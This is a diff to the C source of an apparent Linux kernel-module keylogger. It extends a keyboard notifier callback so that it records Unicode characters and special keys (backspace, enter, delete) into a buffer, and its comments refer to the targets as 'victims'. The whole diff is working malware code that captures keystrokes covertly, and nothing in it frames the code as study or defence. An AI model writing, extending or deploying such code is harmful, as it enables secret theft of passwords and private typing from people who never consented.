@@ -53,24 +53,80 @@ static void append_char(char c)
     }
 }
 
+static void append_token(const char *token)
+{
+    int i;
+
+    for (i = 0; token[i] != '\0'; i++)
+    {
+        if (key_index >= LOG_BUF_SIZE - 1)
+        {
+            break;
+        }
+
+        key_buffer[key_index] = token[i];
+        key_index++;
+    }
+}
+
+static void log_unicode_char(unsigned int ch)
+{
+    char c = (char)ch;
+
+    // ASCII space to ~
+    if ((c >= 0x20 && c <= 0x7E))
+    {
+        append_char(c);
+    }
+}
+
+static void log_keysym(unsigned int sym)
+{
+    // Backspace on both victims
+    if (sym == 0xF008) 
+    {
+        append_token("[BS]");
+        return;
+    }
+
+    // Enter on both victims
+    if (sym == 0xF201) 
+    {
+        append_char('\n');
+        return;
+    }
+
+    // Optional: Delete (different codes on different victims)
+    if (sym == 0xF07F || sym == 0xF702) 
+    {
+        append_token("[DEL]");
+        return;
+    }
+
+    char c = (char)sym;
+
+    if (c >= 0x20 && c <= 0x7E) 
+    {
+        append_char(c);
+    }
+}
+
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct
 
-    // Filter for actual symbols and key presses (down)
-    if (code == KBD_KEYSYM && param->down) // Only process events after the kernel translates the hardware code (KBD_KEYSYM)
+    if (!param->down)
     {
-        char key = (char)param->value; 
+        return NOTIFY_OK;
+    }
 
-        // Only log if its printable ASCII (Space to '~') or newline
-        if ((key >= 0x20 && key <= 0x7E) || key == '\n') 
-        {
-            if (key_index < LOG_BUF_SIZE - 1) 
-            {
-                key_buffer[key_index] = key; 
-                key_index++;
-            }
-        }
+    if (code == KBD_UNICODE) 
+    {
+        log_unicode_char(param->value); // text
+    } 
+    else if (code == KBD_KEYSYM) 
+    {
+        log_keysym(param->value); // actions
     }
 
     return NOTIFY_OK; 
